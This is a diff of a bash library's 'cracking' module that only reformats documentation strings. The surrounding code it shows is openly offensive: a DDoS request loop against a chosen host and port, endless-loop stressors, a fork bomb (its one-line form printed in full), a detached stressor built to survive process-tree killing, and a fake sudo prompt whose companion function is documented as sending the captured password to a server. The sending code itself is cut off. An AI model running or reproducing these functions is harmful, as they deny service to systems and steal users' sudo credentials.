@@ -14,10 +14,12 @@ alias bl.cracking.make_simple_ddos_attach=bl_cracking_make_simple_ddos_attack
 bl_cracking_make_simple_ddos_attack() {
     # shellcheck disable=SC2016,SC2034
     local __documentation__='
-    Makes a ddos attack to given host on given port. First argument: Number
-    of requests. Second argument: Port
+        Makes a ddos attack to given host on given port. First argument: Number
+        of requests. Second argument: Port
 
-    `bl.cracking.make_simple_ddos_attack 100 80`
+        ```bash
+            bl.cracking.make_simple_ddos_attack 100 80`
+        ```
     '
     local index
     for (( index=0; index<"$1"; index++ )); do
@@ -29,9 +31,11 @@ alias bl.cracking.stress_system=bl_cracking_stress_system
 bl_cracking_stress_system() {
     # shellcheck disable=SC2016,SC2034
     local __documentation__='
-    Stress system with given number of endless loops.
+        Stress system with given number of endless loops.
 
-    `bl.cracking.stress_system 10`
+        ```bash
+            bl.cracking.stress_system 10`
+        ```
     '
     local index
     for (( index=0; index<"$1"; index++ )); do
@@ -43,9 +47,11 @@ alias bl.cracking.endless_loop=bl_cracking_endless_loop
 bl_cracking_endless_loop() {
     # shellcheck disable=SC2016,SC2034
     local __documentation__='
-    Starts an endless loop.
+        Starts an endless loop.
 
-    `bl.cracking.endless_loop`
+        ```bash
+            bl.cracking.endless_loop
+        ```
     '
     while true; do
         :
@@ -56,9 +62,15 @@ alias bl.cracking.fork_bomb=bl_cracking_fork_bomb
 bl_cracking_fork_bomb() {
     # shellcheck disable=SC2016,SC2034
     local __documentation__='
-    Implementation for fork bomb. Note short version: :() { : | : & }; :
+        Implementation for fork bomb. Note short version:
 
-    `bl.cracking.fork_bomb`
+        ```bash
+            :() { : | : & }; :
+        ```
+
+        ```bash
+            bl.cracking.fork_bomb
+        ```
     '
     bl.cracking.fork_bomb | bl.cracking.fork_bomb &
     return $?
@@ -67,10 +79,12 @@ alias bl.cracking.stress_system_with_fork_bomb=bl_cracking_stress_system_with_fo
 bl_cracking_stress_system_with_fork_bomb() {
     # shellcheck disable=SC2016,SC2034
     local __documentation__='
-    Runs a forkbomb in an endless loop. This is useful if operating system
-    kills the whole process tree.
+        Runs a forkbomb in an endless loop. This is useful if operating system
+        kills the whole process tree.
 
-    `bl.cracking.stress_system_with_fork_bomb`
+        ```bash
+            bl.cracking.stress_system_with_fork_bomb
+        ```
     '
     while true; do
         bl.cracking.fork_bomb
@@ -81,10 +95,12 @@ alias bl.cracking.make_system_unattainable=bl_cracking_make_system_unattainable
 bl_cracking_make_system_unattainable() {
     # shellcheck disable=SC2016,SC2034
     local __documentation__='
-    Uses a stress system algorithm in its own process to avoid solving the
-    problem by process tree killing.
+        Uses a stress system algorithm in its own process to avoid solving the
+        problem by process tree killing.
 
-    `bl.cracking.make_system_unattainable`
+        ```bash
+            bl.cracking.make_system_unattainable
+        ```
     '
     nohup bash --login -c bl.cracking.stress_system &>/dev/null &
     return $?
@@ -93,9 +109,11 @@ alias bl.cracking.fake_sudo_password_attempt=bl_cracking_fake_sudo_password_atte
 bl_cracking_fake_sudo_password_attempt() {
     # shellcheck disable=SC2016,SC2034
     local __documentation__='
-    Shows a fake sudo password attempt.
+        Shows a fake sudo password attempt.
 
-    `bl.cracking.fake_sudo_password_attempt`
+        ```bash
+            bl.cracking.fake_sudo_password_attempt
+        ```
     '
     local number password
     for number in 1 2 3; do
@@ -110,9 +128,11 @@ alias bl.cracking.grab_sudo_password=bl_cracking_grab_sudo_password
 bl_cracking_grab_sudo_password() {
     # shellcheck disable=SC2016,SC2034
     local __documentation__='
-    Shows a fake sudo password attempt and send to password to server.
+        Shows a fake sudo password attempt and send to password to server.
 
-    `bl.cracking.grab_sudo_password`
+        ```bash
+            bl.cracking.grab_sudo_password
+        ```
     '
     local password
     local user=$(whoami)
